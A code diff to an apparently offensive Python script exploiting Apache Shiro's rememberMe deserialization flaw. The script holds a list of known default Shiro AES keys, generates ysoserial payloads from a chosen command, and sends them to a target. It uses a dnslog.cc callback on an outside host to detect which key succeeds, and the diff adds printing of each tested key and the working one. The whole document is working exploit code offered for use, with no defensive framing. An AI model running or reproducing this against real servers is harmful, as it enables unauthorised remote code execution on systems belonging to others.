@@ -10,8 +10,7 @@ from Crypto.Cipher import AES
 
 JAR_FILE = 'ysoserial.jar'
 
-keys = '''
-kPH+bIxk5D2deZiIxcaaaA==
+keys = '''kPH+bIxk5D2deZiIxcaaaA==
 4AvVhmFLUs0KTA3Kprsdag==
 Z3VucwAAAAAAAAAAAAAAAA==
 fCq+/xW488hMTCD+cmJ3aQ==
@@ -106,8 +105,7 @@ Is9zJ3pzNh2cgTHB4ua3+Q==
 NsZXjXVklWPZwOfkvk6kUA==
 GAevYnznvgNCURavBhCr1w==
 66v1O8keKNV3TTcGPK1wzg==
-SDKOLKn2J1j/2BHjeZwAoQ==
-'''
+SDKOLKn2J1j/2BHjeZwAoQ=='''
 
 
 
@@ -139,13 +137,14 @@ def generator(command, fp,key):
 
 def exp(target):
     for key in keys.split('\n'):
-        token = "shrio-" + uuid.uuid4()
+        print("Test key:" + key.strip())
+        token = "shrio-" + str(uuid.uuid4())
         dnslog = 'http://' + token + '.5c46546e76287d97.dnslog.cc'
         dnslog_api = "http://admin.dnslog.cc/api/dns/5c46546e76287d97/%s/" % token 
         poc(target, dnslog, key.strip())
         r = requests.get(dnslog_api)
         if r.text != 'False':
-            return key.strip()
+            print(key.strip() + "===> OK")
             break
 
 
